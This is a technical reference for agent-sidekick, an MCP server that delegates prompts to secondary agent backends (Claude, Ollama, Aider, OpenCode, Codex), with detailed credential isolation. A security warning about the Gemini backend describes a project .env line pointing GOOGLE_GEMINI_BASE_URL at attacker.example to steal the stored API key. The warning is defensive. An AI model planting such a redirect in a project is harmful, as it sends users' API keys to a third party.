# agent-sidekick: technical reference

agent-sidekick is a local MCP server (stdio) that lets a normal Claude Code session (or an OpenAI Codex CLI session, see [Codex as MCP host](#codex-as-mcp-host)) hand off prompts to a second, headless agent.
Without a `[backends]` section that agent is a second Claude Code instance with its own credentials (a separate account's OAuth token) and its own config directory, so its usage and settings stay apart from your main session. The setup wizard can instead make KI:connect.nrw (through OpenCode) or Gemini the default backend.
Optionally, further [backends](#backends) send work to a local model (Claude Code against Ollama or LM Studio) or to another agent CLI such as Aider.
It is a single binary with no runtime dependencies besides the agent CLI that hosts it: the official `claude` CLI, or the Codex CLI on a machine without Claude Code (see [Codex-only machines](#codex-only-machines)). Prebuilt binaries and the install one-liners are for Linux and Windows 11; on macOS build it from source (`cargo install --locked --git https://github.com/AAPPHH/agent-sidekick`).

This is the complete technical reference (backends, configuration, tools, CLI, security). Installation and first steps for users are in the [README](../README.md) (German); development and releases in [DEVELOPMENT.md](DEVELOPMENT.md) and [RELEASING.md](RELEASING.md).

## Usage

From a Claude Code session, just ask:

> Use sidekick_run with cwd ~/projects/foo and prompt "Run the test suite and fix failing tests"

> Use sidekick_backends, then delegate writing the missing unit tests in ~/projects/foo to the cheapest suitable backend.

> Use sidekick_status to show running and queued sidekick runs.

## Backends

A backend is a place where `sidekick_run` executes a prompt. Backends are configured in `config.toml` under `[backends.<name>]`; there are three types:

| Type | Runs | Credential |
|------|------|------------|
| `claude-oauth` | The official `claude` CLI with a Claude account's OAuth token (the v0.1 behaviour). | Token from `claude setup-token`, stored with `agent-sidekick setup`. |
| `claude-endpoint` | The official `claude` CLI against an Anthropic-compatible endpoint, e.g. a local model in Ollama or LM Studio. | API key stored with `agent-sidekick setup --backend <name>`, or read from an environment variable (`api_key_env`). |
| `command` | Any other agent CLI, e.g. Aider, started directly (no shell) with the prompt as one argument or on stdin. | Optional: a secret stored with `agent-sidekick setup --backend <name>`, handed to the program in the variable named by `secret_env`. |
| `opencode` (only as `harness = "opencode"`) | The [OpenCode](https://opencode.ai) CLI against an OpenAI-compatible endpoint, Ollama or OpenRouter, in a per-backend isolated directory. See [OpenCode backends](#opencode-backends). | Provider key stored with `agent-sidekick setup --backend <name>` (not for Ollama), or read from `api_key_env`. |
| `codex` (only as `harness = "codex"`) | The OpenAI [Codex CLI](https://www.npmjs.com/package/@openai/codex) (`codex exec`), with its own `CODEX_HOME` per backend. See [Codex backends](#codex-backends). | `auth = "chatgpt"`: your ChatGPT plan, logged in once with `codex login` (shown by `agent-sidekick setup --backend <name>`). `auth = "api-key"`: an OpenAI API key stored with `agent-sidekick setup --backend <name>`, or read from `api_key_env`. |

**Harnesses (since 0.3.0):** instead of `type`, a backend can name the agent CLI that runs it with `harness`: `harness = "claude"` without `base_url` is the same as `type = "claude-oauth"`, `harness = "claude"` with `base_url` the same as `type = "claude-endpoint"`, and `harness = "command"` the same as `type = "command"`. `harness = "opencode"` and `harness = "codex"` have no `type` equivalent (`type = "opencode"` / `type = "codex"` are config errors). Existing configs with `type` keep working unchanged; if both are set they must agree (otherwise it is a config error). `agent-sidekick harness list` shows whether each harness is installed (path, version), `agent-sidekick harness install <name>` prints its official install command (it never runs it).

**Upgrading from v0.1:** without a `[backends]` section there is one implicit backend named `claude` of type `claude-oauth` that uses the existing token, config dir and `default_model`. Before v0.6 this backend was called `sidekick`. Callers now pass `backend: "claude"`; `sidekick` is accepted only when a config.toml declares `[backends.sidekick]`, which keeps working with the same token and config dir (see [Secrets per backend](#secrets-per-backend)).
As soon as `[backends]` exists, only the backends listed there are available.

### Example

Three backends: the second Claude account (default), Claude Code against a local `qwen3-coder` in Ollama, and Aider with the same model. The commented version is [`examples/config.toml`](../examples/config.toml); it adds a fourth, optional backend `kiconnect` (see [Command backend with a stored key](#command-backend-with-a-stored-key)), which is reachable only after its key is stored.

```toml
max_concurrent = 16         # global limit over all backends (default 16)

[backends.claude]
type = "claude-oauth"
description = "Second Claude subscription account (Claude Code). Best quality for complex, multi-file changes and debugging; uses that account's quota."
default = true
cost = "quota"
permission_mode = "acceptEdits"
allowed_tools = ["Bash", "Read", "Edit", "Write", "Glob", "Grep"]

[backends.local]
type = "claude-endpoint"
description = "Claude Code driving a local qwen3-coder via Ollama. Free and private, but slower and weaker than Claude: good for boilerplate, tests, docs and mechanical refactors; not for subtle multi-file logic."
cost = "free"
base_url = "http://localhost:11434"
model = "qwen3-coder"

[backends.aider]
type = "command"
description = "Aider with local qwen3-coder (Ollama). Free; edits files in cwd directly without asking (no tool permissions, no shell commands), changes are left uncommitted. Good for small, well-specified edits to named files."
cost = "free"
command = ["aider", "--model", "ollama_chat/qwen3-coder", "--yes-always", "--no-auto-commits", "--no-check-update", "--message", "{prompt}"]
env = { OLLAMA_API_BASE = "http://127.0.0.1:11434" }
max_concurrent = 1
```

Then store the credentials and check the backends (a bare `agent-sidekick setup` in an interactive terminal starts the German setup wizard, which adds its own profiles; `--no-wizard` gets the plain token prompts):

```sh
agent-sidekick setup --no-wizard         # token for every claude-oauth backend (here: sidekick)
agent-sidekick setup --backend local     # API key for the endpoint; for a local Ollama enter any value, e.g. "ollama"
agent-sidekick backends list --check
agent-sidekick backends test local
```

### Command backend with a stored key

A `command` backend can get a secret, e.g. the API key of a hosted OpenAI-compatible service, without putting it into `config.toml` or the MCP registration. `secret_env` names the variable the program reads it from. Example: Aider against the KI:connect.nrw gateway (any OpenAI-compatible endpoint works the same way), as one backend for the provider that offers two of its models (see [Models](#models)):

```toml
[backends.kiconnect]
type = "command"
description = "Aider via KI:connect.nrw (university quota). Free, medium quality; edits files in cwd directly without asking. For boilerplate, tests and small, well-specified changes. Models: openai-gpt-oss-120b (general), qwen-qwen3-8-27b (code)."
cost = "free"
command = ["aider", "--model", "openai/{model}", "--no-git", "--yes-always", "--no-show-model-warnings", "--no-check-update", "--no-pretty", "--no-stream", "--message", "{prompt}"]
models = ["openai-gpt-oss-120b", "qwen-qwen3-8-27b"]   # the first one is the default
env = { OPENAI_API_BASE = "https://chat.kiconnect.nrw/api/v1", PYTHONUTF8 = "1" }
secret_env = "OPENAI_API_KEY"
```

```sh
agent-sidekick setup --backend kiconnect    # asks for the value of OPENAI_API_KEY (input hidden)
agent-sidekick backends test kiconnect
```

The value is stored like the other secrets (OS keyring user `cmd-kiconnect`, file fallback `cmd-kiconnect.key`, see [Secrets per backend](#secrets-per-backend)) and set as `OPENAI_API_KEY` for this backend's runs only, replacing an inherited value of that name. It never appears in `config.toml`, `sidekick_status`, `sidekick_backends`, `backends list`/`test` or `doctor` (they show only where it is stored), and it is redacted from the run's output and log. Values shorter than 8 characters are not redacted; `setup` warns about that. `PYTHONUTF8=1` avoids encoding errors of Aider on Windows.

### Models

One backend per provider, the model as a parameter: a backend can offer several models, and the calling session picks the backend **and** the model (`sidekick_run` parameter `model`). Configure it with two keys, allowed for every type:

- `models`: the models the backend offers, e.g. `["openai-gpt-oss-120b", "qwen-qwen3-8-27b"]`. It is an **allowlist**: a `model` that is not in it is rejected before anything runs (`sidekick_run` returns an error listing the allowed models; no fallback is tried, because the parameter is invalid). Names must be unique (case-sensitive), not blank, without leading/trailing whitespace or control characters, and must not start with `-` (they may end up in a command line, where they could be taken as an option). Inner spaces are allowed (some gateways use ids such as `Mistral Small 3.2 24B Instruct 2506`).
- `model`: the default model, used when the request names none. With `models` it must be one of them; without `model` the default is the first entry of `models`.

Per type:

- **claude-oauth / claude-endpoint**: the model is passed as `--model`. `models` is optional; without it any model is accepted (aliases like `opus`, `sonnet`, `haiku` or full model ids), as before. With it, only the listed ones.
- **command**: the model reaches the program only through the placeholder `{model}` in an argument (e.g. `"openai/{model}"`). It is substituted in the same single pass as `{prompt}`, `{cwd}` and `{max_turns}` and always stays inside its argument. Because the value lands in the program's argument list, `models` is **required** when `{model}` is used; `models` or `model` without `{model}` in `command` is a config error (it would have no effect). A command backend without `{model}` ignores the request's `model` (the result notes it).

With a `fallback`, the requested model is checked against the fallback backend's own `models`: if the fallback does not offer it, the fallback runs with its default model and the result says so (`note: model X not offered by <fallback>; used its default Y`).

`sidekick_backends` lists `models` and `default_model` for every backend, so the calling session can choose from them; `backends list` shows them in the MODELS column (default first, marked with `*`) and `backends test <name>` prints them.

Notes for the `local` backend:

- **Ollama** (0.14 or later serves the Anthropic Messages API): `ollama pull qwen3-coder`, base URL `http://localhost:11434`. A local Ollama ignores the key, so any value works. Keys shorter than 8 characters (such as `ollama`) are not redacted from the agent's output, so a placeholder never mangles it; `setup` warns about this.
- **Ollama's cloud** (`https://ollama.com`) needs a real key and `auth = "bearer"`.
- **LM Studio**: `base_url = "http://localhost:1234"`, `auth = "bearer"` (LM Studio's documentation uses the Bearer form), `model` = the model identifier shown in LM Studio. Optionally `env = { CLAUDE_CODE_ATTRIBUTION_HEADER = "0" }`, as in LM Studio's Claude Code docs (helps its prompt caching).
- The model has to handle Claude Code's long system prompt and tool calls; give the server a large context window (e.g. `OLLAMA_CONTEXT_LENGTH`).

### How the backend is chosen

The **caller** (the main Claude Code session) picks the backend. It calls `sidekick_backends`, reads each backend's `description`, `cost` and `reachable`, and passes `backend` to `sidekick_run`.
agent-sidekick does no routing of its own, so write descriptions for that reader: what the backend is good and bad at, how fast it is, and what it costs. Routing rules in your `CLAUDE.md` help further, see the [CLAUDE.md routing example](#claudemd-routing-example).

- Without `backend`, `sidekick_run` uses the backend with `default = true`. Exactly one backend must be the default.
- An unknown backend name is a tool error that lists the configured names.
- If `config.toml` cannot be parsed or validated, `sidekick_run` fails with a tool error that names the problem; it never silently falls back to the implicit backend. `sidekick_backends` and `sidekick_status` show the error too.

### Fallback

`sidekick_run` accepts `fallback`, the name of a second backend that is used when the primary one fails:

- **Triggers:** the primary backend is not reachable (endpoint probe failed), its credential is missing, its executable is not found or cannot be started, or the primary run **exits with a non-zero exit code**, or (opencode) exits 0 **without an answer** (e.g. a permission was auto-rejected; the result shows `failed: no answer: ...`). A detected rate limit is a trigger too (see [Rate limits](#rate-limits-http-429)).
- **Never** after a timeout or a cancellation, and not for invalid parameters (`prompt`, `cwd`, `max_turns`, ...).
- **The primary may have changed files.** After a non-zero exit the primary agent did run; the result says so explicitly, with its exit code and log path. Only use a fallback for tasks that are safe to retry, and check `git status` afterwards.
- Single level: the fallback has no fallback of its own. `fallback` equal to `backend` is an error.
- **A fallback from a `claude-oauth` backend to another `claude-oauth` backend is rejected** with an explanatory error: switching from one Claude account to another when the first one fails (for example because its usage limit is reached) would be account switching / rate-limit circumvention, which agent-sidekick does not do (see [Terms of use](#terms-of-use)).
- The primary run's concurrency slots (per backend and global) are released before the fallback waits for its own.

### Rate limits (HTTP 429)

Runs that hit provider rate limits are detected and handled specially.

- **Detection:** opencode and codex runs are checked in their error events only (not in tool output), claude and command runs in the output tail, but only for unambiguous API markers ("rate_limit_error", "rate limit reached", "429 Too Many Requests"). A detected rate limit adds the line `rate_limited: yes (retry after Ns)` (or `rate_limited: yes` when no wait time is given) to the result.
- **Wait time:** taken from "retry-after: N" or "try again in ..." in the error message (formats like 22.5s, 1m2.3s, 450ms, 5 minutes); rounded up to whole seconds.
- **Fallback:** a rate-limited run counts as failed, so `fallback` takes over; the result says `fallback reason: rate limited`.
- **Cooldown:** after a rate limit the backend is in cooldown for the wait time (60 s when unknown, at most 3600 s). During the cooldown `sidekick_backends` reports it as not reachable with "rate limited, retry in Ns", `sidekick_status` lists it ("cooldown: <name> retry in Ns"), and `sidekick_run` does not start it: with a `fallback` that is not cooling down itself the fallback runs directly (`fallback reason: primary <name> rate limited, retry in Ns`), otherwise the call fails with a tool error naming the remaining time. A fallback that is cooling down is skipped (`fallback '<name>' skipped: rate limited, retry in Ns`).
- **Scope:** the cooldown is per backend name and kept in memory only (a server restart clears it); two backends on the same provider account cool down separately.
- **Not rate-limit circumvention:** the cooldown makes agent-sidekick stop sending requests to a provider that asked it to wait; a fallback from one claude-oauth backend to another stays rejected (see Fallback).
- **Typical case:** Groq's free tier allows about 8000 tokens per minute per model, while one OpenCode step sends about 7000 tokens, so nearly every step first gets HTTP 429 and OpenCode waits (about one step per minute).

### Concurrency

`max_concurrent` at the top level is a global limit over all backends (default 16, at most 1024). A backend can additionally have its own `max_concurrent`, e.g. 1 for a local GPU.
A run waits for a slot of its backend first, then for a global slot; queued runs are visible in `sidekick_status`.

Advice for many parallel runs (20 or more):

- **Quota:** parallel runs on one backend share that account's or key's quota and rate limits; more parallel runs reach the limit sooner (the backend then cools down, see [Rate limits](#rate-limits-http-429)). Spread the work over backends or set a per-backend `max_concurrent`.
- **Separate working directories:** runs in the same `cwd` edit the same files and the same git index. Give every parallel run its own directory, e.g. one git worktree per run (`git worktree add ../wt-1 -b task-1`).
- Changing a limit in config.toml takes effect for the next run (see [Configuration](#configuration)); runs already started or queued keep their slot.

### Reachability

`reachable` in `sidekick_backends` means:

- `claude-oauth`: `claude` is found and a token is stored for the backend.
- `claude-endpoint`: `claude` is found, the key is available (stored, or the `api_key_env` variable is set), and an HTTP `GET` of `base_url` answers within 2 seconds. Any HTTP response counts, also 4xx/5xx; connection errors and timeouts do not.
- `command`: the program (`command[0]`) is found, and with `secret_env` a secret is stored for the backend.
- `opencode`: OpenCode is installed (found), the provider key is available (not needed for Ollama), and the provider's model list answers within 2 seconds: `GET {base_url}/models` with the key as `Authorization: Bearer` (openai-compatible), `GET {base_url}/api/tags` (Ollama), `GET https://openrouter.ai/api/v1/models` without key (OpenRouter). Any HTTP response counts except 401/403, which means the key was rejected.
- `codex`: Codex is installed (found); `auth = "chatgpt"`: the login file `<CODEX_HOME>/auth.json` exists (only its existence is checked, it is never read; no network request); `auth = "api-key"`: the key is available and `GET {base_url}/models` (without `base_url`: `https://api.openai.com/v1/models`) with the key as bearer token answers with anything but 401/403.

The HTTP probes are the only network requests agent-sidekick makes itself for backends (never a model call; for every other request see [Security](#security)). They go only to the configured `base_url` (which must not contain credentials, see [claude-endpoint backends](#claude-endpoint-backends)), OpenRouter's public model list or, for a codex api-key backend without `base_url`, OpenAI's model list; they follow no redirects, have a 2 s timeout and run only for `sidekick_backends`, `agent-sidekick backends list --check` / `backends test`, `doctor`, and right before a run on a `claude-endpoint`, `opencode` or codex api-key backend. Only the openai-compatible opencode probe and the codex api-key probe carry a credential (the backend's own key, to its own provider); all others carry none.
Loopback hosts are probed directly; other hosts go through the proxy from `HTTPS_PROXY`/`HTTP_PROXY`/`ALL_PROXY` (honouring `NO_PROXY`), as `claude` itself would. A proxy that answers for an unreachable upstream makes the endpoint look reachable.

### Secrets per backend

| Backend | Keyring (service `agent-sidekick`), user | File fallback in the config dir | Environment override |
|---------|------------------------------------------|---------------------------------|----------------------|
| `claude-oauth` named `claude` or `sidekick` (implicit or declared) | `oauth-token` | `token` | `AGENT_SIDEKICK_TOKEN` |
| other `claude-oauth` | `oauth-token-<name>` | `token-<name>` | none |
| `claude-endpoint` | `endpoint-<name>` | `endpoint-<name>.key` | `api_key_env` (a variable of the MCP server's environment) |
| `command` with `secret_env` | `cmd-<name>` | `cmd-<name>.key` | none (the value goes into the variable `secret_env` names) |
| `command` without `secret_env` | none | none | none |
| `opencode` (openai-compatible, openrouter) | `backend-<name>` | `backend-<name>.key` | `api_key_env` (a variable of the MCP server's environment) |
| `opencode` with `provider = "ollama"` | none | none | none |
| `codex` with `auth = "api-key"` | `backend-<name>` | `backend-<name>.key` | `api_key_env` (a variable of the MCP server's environment) |
| `codex` with `auth = "chatgpt"` | none (Codex keeps the login in `<config-dir>/codex/<name>/auth.json`, written by `codex login`) | none | none |

A backend named `claude` (or `sidekick`, its name before v0.6) therefore keeps using the token of a v0.1 installation. Because they share that token, a config may not declare both as `claude-oauth` backends. Files are created with mode 0600 (Unix) or a user-only ACL (Windows).
`api_key_env` is read from the environment of the MCP server, i.e. what Claude Code passes to it; set the variable in the user or OS environment that Claude Code inherits, or add it to the registration (`claude mcp add ... -e NAME=value`). Re-running `agent-sidekick setup` keeps such extra `-e` variables of the user-scope registration (it prints their names, never their values), see [CLI reference](#cli-reference).
The variable is removed from the environment of every other backend's runs, see [session isolation](#child-environment-and-session-isolation).

### Child environment and session isolation

Every child inherits the MCP server's environment, minus:

- every variable starting with `CLAUDE_CODE_` or `CLAUDE_AGENT_SDK_`, and `CLAUDECODE`, `CLAUDE_PID`, `CLAUDE_EFFORT`, `CLAUDE_CONFIG_DIR`, `AI_AGENT`, `MCP_CONNECTION_NONBLOCKING`. Exception: `CLAUDE_CODE_GIT_BASH_PATH` is kept, because Claude Code on Windows needs it to find Git Bash (it is host configuration, not session state or a credential);
- every variable starting with `CODEX_`: the session and settings of a Codex host (`CODEX_HOME`, `CODEX_SQLITE_HOME`, `CODEX_SESSION_ID`, `CODEX_THREAD_ID`, `CODEX_TOOL_CALL_ID`, `CODEX_CI`, `CODEX_SANDBOX*`, `CODEX_MANAGED_*`, ...) and its credentials (`CODEX_API_KEY`, `CODEX_ACCESS_TOKEN`). Exception: `CODEX_CA_CERTIFICATE` (a corporate CA bundle) is kept. Codex passes an MCP server only an allowlisted environment, but a server started from a shell inside a Codex session would otherwise hand these on;
- competing credentials: `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `AGENT_SIDEKICK_TOKEN` (and `CLAUDE_CODE_OAUTH_TOKEN` via the prefix rule);
- every variable named in the `api_key_env` of any configured backend, for all other backends, so one endpoint's key never reaches another backend's child (the owning endpoint gets its key as `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN` anyway);
- `ANTHROPIC_BASE_URL` for `claude-endpoint` (which sets its own) and `command` backends. For `claude-oauth` an inherited `ANTHROPIC_BASE_URL` is kept (proxies) and logged as a warning;
- `ANTHROPIC_CUSTOM_HEADERS` for `claude-endpoint` and `command` backends: Claude Code adds these headers to every API request, so a gateway credential of the caller would otherwise reach a third-party `base_url`. It is kept for `claude-oauth`;
- inherited model overrides (`ANTHROPIC_MODEL`, `ANTHROPIC_SMALL_FAST_MODEL`, `ANTHROPIC_DEFAULT_*_MODEL`) for `claude-endpoint`: the backend configures its own `model`, and the caller's model names usually do not exist on that endpoint. Set them in the backend's `env` table when the endpoint needs them. Other inherited `ANTHROPIC_*` variables of `command` backends are left alone (tools such as Aider may use them).

Why: Claude Code starts the MCP server and passes its session variables on (session id, entrypoint, a messaging socket and token, ...). A child `claude` that sees them identifies as part of the parent session, receives the parent's messaging socket and token, and in API-key mode refuses to start ("Not logged in"). The prefix rule also removes provider switches such as `CLAUDE_CODE_USE_BEDROCK`.

Then the backend's `env` table is applied (it may set `CLAUDE_CODE_*` variables; only inherited ones are removed), and finally the type-specific variables:

| Type | Set by agent-sidekick |
|------|-----------------------|
| `claude-oauth` | `CLAUDE_CONFIG_DIR`, `CLAUDE_CODE_OAUTH_TOKEN` |
| `claude-endpoint` | `CLAUDE_CONFIG_DIR`, `ANTHROPIC_BASE_URL`, `ANTHROPIC_API_KEY` (`auth = "x-api-key"`) or `ANTHROPIC_AUTH_TOKEN` (`auth = "bearer"`). `CLAUDE_CODE_OAUTH_TOKEN` is never set. |
| `command` | nothing; with `secret_env`, that variable is set to the backend's stored secret (last, so it replaces an inherited value or a `pass_env` exception of the same name) |
| `opencode` | `AGENT_SIDEKICK_PROVIDER_KEY` (the provider key), the isolation variables (`HOME`, on Windows also `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`; `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `XDG_STATE_HOME`, `XDG_CACHE_HOME`, `TEMP`, `TMP`, `TMPDIR`, `npm_config_cache`), the `OPENCODE_DISABLE_*` flags, `OPENCODE_PERMISSION`, `OPENCODE_CONFIG_CONTENT` and on Windows `OPENCODE_GIT_BASH_PATH`. Inherited `OPENCODE_*`, `ANTHROPIC_*`, `OPENAI_API_KEY`, `OPENROUTER_API_KEY`, `PWD`, `OLDPWD` and `npm_config_cache` are removed first. See [OpenCode backends](#opencode-backends). |
| `codex` | `CODEX_HOME` and `CODEX_SQLITE_HOME` (both `<config-dir>/codex/<name>`); with `auth = "api-key"` the key as `CODEX_API_KEY` (OpenAI) or `AGENT_SIDEKICK_PROVIDER_KEY` (with `base_url`). Inherited `ANTHROPIC_*`, `OPENAI_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_FEDERATION_RULE_ID`, `OPENAI_IDENTITY_TOKEN_FILE`, `OPENAI_WORKLOAD_IDENTITY_CONTEXT`, `RUST_LOG` and `AGENT_SIDEKICK_PROVIDER_KEY` are removed first (not re-allowable with `pass_env`, nor `CODEX_HOME`, `CODEX_SQLITE_HOME`, `CODEX_API_KEY`, `CODEX_ACCESS_TOKEN`). `HOME`/`USERPROFILE` stay the user's. See [Codex backends](#codex-backends). |

The `secret_env` of a command backend is treated like an `api_key_env`: an inherited variable of that name is removed from every backend's child (the command backend itself gets the stored value).

Each run's environment is built from the server's environment, so one backend's stored key never reaches another backend, and a key read through `api_key_env` is removed from the other backends as described above.

`pass_env` (top level for all backends, or per backend) re-allows inherited variables that the rules above would remove, e.g. `pass_env = ["CLAUDE_CODE_MAX_OUTPUT_TOKENS"]`. Variables that are not removed anyway (such as `OLLAMA_API_BASE`) need no `pass_env`. Limits:

- `CLAUDE_CODE_OAUTH_TOKEN` and `AGENT_SIDEKICK_TOKEN` can never be passed (config error).
- `ANTHROPIC_API_KEY` and `ANTHROPIC_AUTH_TOKEN` can only be passed to `command` backends (config error in the top-level `pass_env` and for `claude-*` backends).
- `CLAUDE_CONFIG_DIR` is not passed to `claude-*` backends, and `ANTHROPIC_BASE_URL` not to `claude-endpoint` backends (they set their own).
- A variable named in another backend's `api_key_env` or `secret_env` never reaches a backend from the inherited environment, not even through `pass_env`; only the backend's own `env` table (or its own `secret_env`) can set a variable of that name.

### Command backends

- `command` is an argument array; the first element is the program. **No shell** is involved: pipes, redirections, `$VAR` or `%VAR%` in the array are passed literally.
- Placeholders `{prompt}`, `{cwd}`, `{max_turns}` and `{model}` are replaced inside each element in a single pass. The replacement is never scanned again, so a prompt that contains `{cwd}` or `{model}` stays literal, and `{prompt}` always ends up in **one** argument, whatever it contains. Unknown `{...}` are left as is. `{model}` requires `models`, see [Models](#models).
- `command` must contain `{prompt}` in an argument after `command[0]`, unless `prompt_via_stdin = true`: then the prompt is written to the program's stdin and `{prompt}` must not appear. `command[0]` (the program) is never substituted, so a placeholder there is a config error.
- A bare program name is looked up in the absolute `PATH` entries (on Windows with `PATHEXT`); empty or relative `PATH` entries are ignored, and a relative path with a directory separator is rejected. An absolute path must exist.
- On Windows, `.cmd`/`.bat` programs require `prompt_via_stdin = true` (otherwise the run fails with an error): `cmd.exe` cannot pass arbitrary prompt text safely as an argument. Point `command[0]` at an `.exe` otherwise (pip installs Aider as `aider.exe`).
- The prompt is always an argument unless `prompt_via_stdin` is set; very long prompts can exceed the OS command-line limit (about 32 000 characters on Windows), so prefer `prompt_via_stdin` for tools that support it.
- The `allowed_tools` parameter of `sidekick_run` is ignored for command backends, and so is `model` unless the command uses `{model}` (the result and the log note it).
- Command backends are configured only in `config.toml`. `sidekick_run` can select one by name but can never supply or change a command.
- The program runs with the permissions of the MCP server; tools like Aider with `--yes-always` edit files without asking.
- **Gemini CLI (the wizard's `gemini` profile) trusts the project.** The command passes `--skip-trust`; without it every headless run in a folder the Gemini CLI has not been told to trust fails (`FatalUntrustedWorkspaceError`). With the workspace trusted, Gemini CLI (checked in 0.65.0) loads every key of the project's `.env` (in `cwd` or a parent directory, also `.gemini/.env`) that is not already set, and the project's `.gemini/settings.json` (MCP servers, hooks, custom commands). A `.env` with `GOOGLE_GEMINI_BASE_URL=https://attacker.example` sends the stored `GEMINI_API_KEY` to that host with the first model request, without any tool call; `.gemini/settings.json` can run code at startup with the key in its environment. For a command backend whose `command` contains `gemini`, agent-sidekick writes a warning into the run log and the server log when `.env`, `.gemini/.env` or `.gemini/settings.json` exists between `cwd` and the repository root (the first directory with `.git`); it does not block the run. Only run the Gemini backend in directories you trust, and use a key you can revoke.
- `secret_env = "VAR"` hands the backend's stored secret to the program in `VAR`, see [Command backend with a stored key](#command-backend-with-a-stored-key). `VAR` must be a plain variable name (`A-Z`, `a-z`, `0-9`, `_`), must not be `CLAUDE_CODE_OAUTH_TOKEN`, `AGENT_SIDEKICK_TOKEN` or `AGENT_SIDEKICK_*`, and must not also be a key of `env` (config errors). `ANTHROPIC_API_KEY` is allowed, e.g. for Aider with Claude models. Without a stored secret the backend is not reachable and a run fails with a hint to `setup --backend <name>`.

### claude-endpoint backends

- `base_url` is required (`http://` or `https://`), `model` is passed as `--model`.
- `base_url` must not contain credentials (`user:password@`); that is a config error. Store the key with `agent-sidekick setup --backend <name>` or set `api_key_env`.
- The host of `base_url` must be ASCII (write an internationalised host in its `xn--` punycode form) and a port must be a valid number (1-65535). A URL the reachability probe could not parse is rejected when `config.toml` is loaded, not at run time.
- Each endpoint backend has its own `CLAUDE_CONFIG_DIR` (default `~/.claude-sidekick-<name>`). It must differ from the config dir of every `claude-oauth` backend (config error otherwise): a claude.ai login saved there would stay active and could be used instead of the endpoint.
- `CLAUDE_CODE_OAUTH_TOKEN` is never set for an endpoint backend, also not via `pass_env` or `env`, and `api_key_env` may not name it.

### OpenCode backends

[OpenCode](https://opencode.ai) is an open-source agent CLI that works with any OpenAI-compatible API. Install it (`agent-sidekick harness install opencode` prints the official commands; agent-sidekick never runs them), e.g. `npm install -g opencode-ai`, then configure a backend. Example: the KI:connect.nrw gateway of German universities with two of its models:

```toml
[backends.kiconnect]
harness = "opencode"
provider = "openai-compatible"
base_url = "https://chat.kiconnect.nrw/api/v1"
models = ["openai-gpt-oss-120b", "qwen-qwen3-8-27b"]   # the first one is the default
description = "OpenCode agent via KI:connect.nrw (university quota). Free, medium quality; reads, edits and runs commands in cwd without asking. For boilerplate, tests and small, well-specified changes. Models: openai-gpt-oss-120b (general, default), qwen-qwen3-8-27b (code)."
cost = "free"
max_concurrent = 1
```

```sh
agent-sidekick setup --backend kiconnect    # asks for the provider API key (input hidden)
agent-sidekick backends test kiconnect      # opencode found, key stored, GET .../models answers
```

Keys:

| Key | Meaning |
|-----|---------|
| `harness` | `"opencode"` (required; there is no `type` for it). |
| `provider` | `"openai-compatible"` (any `/chat/completions` API; `base_url` is the part before `/chat/completions`), `"ollama"` (`base_url` like `http://localhost:11434`, `/v1` is appended; no key) or `"openrouter"` (OpenCode's built-in provider; no `base_url`). |
| `base_url` | Required for openai-compatible and ollama, not allowed for openrouter. Same rules as for claude-endpoint (no credentials, ASCII host). |
| `models` / `model` | Required (at least one): the models the provider serves. `models` is the allowlist, `model` the default (else the first entry); a lone `model` is the only allowed model. All of them are declared to OpenCode with tool calling enabled. |
| `api_key_env` | Read the key from this variable of the MCP server's environment instead of the stored one (not for ollama). |
| `harness_path` | Absolute path (or `~/...`) of the opencode executable. Default: the npm package's real executable (`<npm prefix>/node_modules/opencode-ai/bin/opencode.exe`, found next to an `opencode.cmd` in `PATH` or in `%APPDATA%\npm`; on Unix `<prefix>/lib/node_modules/...`), then `opencode` in `PATH` (on Windows only `opencode.exe`, never the `.cmd` shim), then `~/.opencode/bin/opencode`. A `.cmd`/`.bat` wrapper is accepted only here, with model names restricted to `A-Z a-z 0-9 - _ . / : @ +`. |
| `read_only` | `true`: the edit, bash and webfetch tools are denied (OpenCode then does not offer them). Default `false`. |
| `request_timeout_s` | Seconds OpenCode waits for the provider's response headers before it retries the request (OpenCode's `headerTimeout`, 1 to 3600; unset: OpenCode's default of 300). Raise it for slow local models that need long before the first token. A shorter value does not help against a queueing provider: on KI:connect the retries waited just as long. |
| `model_options` | Table merged into every model entry of the generated opencode.json after `name` and `tool_call` (only openai-compatible and ollama; JSON-compatible values, no dates; `name` and `tool_call` are rejected). Example for gpt-oss on Groq: `model_options = { interleaved = { field = "reasoning" } }`. |
| `cost` | Default `paid` (`free` for ollama). |

`description`, `default`, `max_concurrent`, `env` and `pass_env` work as for every backend; `config_dir`, `auth`, `command`, `prompt_via_stdin` and `secret_env` are not allowed.

How a run works:

- argv: `opencode run --format json --model <provider>/<model> --title agent-sidekick` (provider id `sidekick` for openai-compatible and ollama, `openrouter` for OpenRouter). The prompt goes to stdin, never into the command line; the process starts in `cwd` and `PWD` is removed (OpenCode would prefer it over the real working directory).
- **Isolation:** each backend has its own directory `<config-dir>/opencode/<name>/` (`home`, `config`, `data`, `state`, `cache`, `tmp`). The child's home (`HOME`, `USERPROFILE`, `HOMEDRIVE`/`HOMEPATH`, `APPDATA`, `LOCALAPPDATA`; `HOMESHARE` is removed), XDG directories, temp directory and npm cache point there, so OpenCode neither reads your own OpenCode configuration (it always reads `~/.opencode`, whatever the flags say) nor writes into your home. Sessions, logs and OpenCode's downloads stay in that directory; `uninstall --purge` removes it with the config directory. OpenCode's session store (`data/opencode/opencode.db*`) holds the complete, **unredacted** transcripts: prompts, tool output and anything the agent printed, including the provider key if the agent printed it (agent-sidekick redacts only its own run log and results). On Unix the backend directory is created with mode 0700; on Windows it inherits the ACL of the config directory (your user profile).
- **Generated config:** `config/opencode/opencode.json` is regenerated before each run from the backend's configuration only (provider, `base_url`, models, permissions; no per-run values, so concurrent runs share it). The key is never written: the config references it as `{env:AGENT_SIDEKICK_PROVIDER_KEY}` and only the child's environment holds it (registered for redaction). Autoupdate, sharing, snapshots, LSP, formatters and plugins are off; only the backend's provider is enabled. `OPENCODE_DISABLE_AUTOUPDATE`, `_PROJECT_CONFIG`, `_EXTERNAL_SKILLS`, `_CLAUDE_CODE`, `_LSP_DOWNLOAD` and `_MODELS_FETCH` are set to 1.
